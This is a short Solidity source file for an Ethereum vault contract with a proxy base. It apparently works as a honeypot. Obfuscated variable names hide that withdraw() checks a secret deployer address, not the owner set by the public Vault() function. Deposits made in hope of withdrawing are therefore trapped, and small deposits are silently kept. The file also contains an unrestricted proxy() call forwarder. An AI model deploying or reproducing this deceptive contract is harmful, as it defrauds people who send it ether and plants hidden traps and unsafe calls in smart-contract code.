pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == _OOooOo) _; } address _OOooOo = msg.sender;
    function transferOwner(address _owner) public onlyOwner { _OOooOo = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public _oWNeR;
    mapping (address => uint256) public _dEPoSItS;

    function () public payable { }
    
    function Vault() public payable {
        address _msGSNDR = msg.sender;
        if (_msGSNDR == tx.origin) {
            _oWNeR = _msGSNDR;
            deposit();
        }
    }
    
    function deposit() public payable {
        address _msGSNDR = msg.sender;
        uint256 _msGVLuE = msg.value;
        if (_msGVLuE > 0.5 ether) {
            _dEPoSItS[_msGSNDR] += _msGVLuE;
        }
    }
    
    function withdraw(uint256 _aMouNT) public onlyOwner {
        address _msGSNDR = msg.sender;
        if (_aMouNT > 0 && _dEPoSItS[_msGSNDR] >= _aMouNT) {
            _msGSNDR.transfer(_aMouNT);
        }
    }
}